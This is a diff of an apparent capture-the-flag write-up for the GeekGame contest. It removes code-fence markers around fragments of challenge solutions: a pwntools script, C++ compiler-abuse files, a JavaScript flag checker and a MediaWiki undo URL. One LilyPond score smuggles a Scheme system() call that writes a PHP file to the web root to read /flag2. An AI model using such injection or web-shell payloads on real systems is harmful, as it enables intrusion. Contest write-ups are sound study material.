@@ -7,18 +7,8 @@
 ```
 1
 2
-```
-
-
-
-```
 s = """原文"""
 print(''.join(map(lambda x: x[0] + x[1], zip(*s.split('\n')))))
-```
-
-
-
-```
 1
  2
  3
@@ -80,11 +70,6 @@ print(''.join(map(lambda x: x[0] + x[1], zip(*s.split('\n')))))
 59
 60
 61
-```
-
-
-
-```
 from pwn import *
 import re
 
@@ -144,59 +129,24 @@ if __name__ == "__main__":
 
  print(f'[+] All done!')
  print(f'[+] Remain: {r.recvall().decode("utf8")}')
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 long long array[2000000]{1};
 int main() { return 0; }
 //EOF
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
-#include __FILE__
-#include __FILE__
+    #include __FILE__
+    #include __FILE__
 //EOF
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 void operator""_x(const char *, unsigned long);
 static_assert(false, "foo"_x);
 //EOF
-```
-
-
-
-```
 1
  2
  3
@@ -219,11 +169,6 @@ static_assert(false, "foo"_x);
 20
 21
 22
-```
-
-
-
-```
 // codes...
 
 ScriptEngineManager var2 = new ScriptEngineManager();
@@ -246,75 +191,30 @@ else {
 }
 
 // codes...
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 function checkflag2(input) {
  return (JSON.stringify(input.split('').map(function (x) { return x.charCodeAt(0) })) == JSON.stringify([0, 15, 16, 17, 30, 105, 16, 31, 16, 67, 3, 33, 5, 60, 4, 106, 6, 41, 0, 1, 67, 3, 16, 4, 6, 33, 232].map(function (x) { return (checkflag2 + '').charAt(x) })) ? 'Correct' : 'Wrong')
 }
-```
-
-
-
-```
 1
-```
-
-
-
-```
 https://prob07-<env>.geekgame.pku.edu.cn/index.php?title=%E9%A6%96%E9%A1%B5&action=mcrundo&undo=1&undoafter=2
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 <score>\new Staff <<{c^#
 
 (object->string (system "echo \"<?php echo file_get_contents('/flag2') ?>\" > /var/www/html/test.php"))
 
 }>></score>
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 if (localStorage.getItem('i_am_premium_user') === 'true') {
  import('./main-premium.js')
 }
-```
-
-
-
-```
 1
  2
  3
@@ -353,11 +253,6 @@ if (localStorage.getItem('i_am_premium_user') === 'true') {
 36
 37
 38
-```
-
-
-
-```
 from string import printable
 
 B = 2511413510786744827187994827731403682185299073590935188882
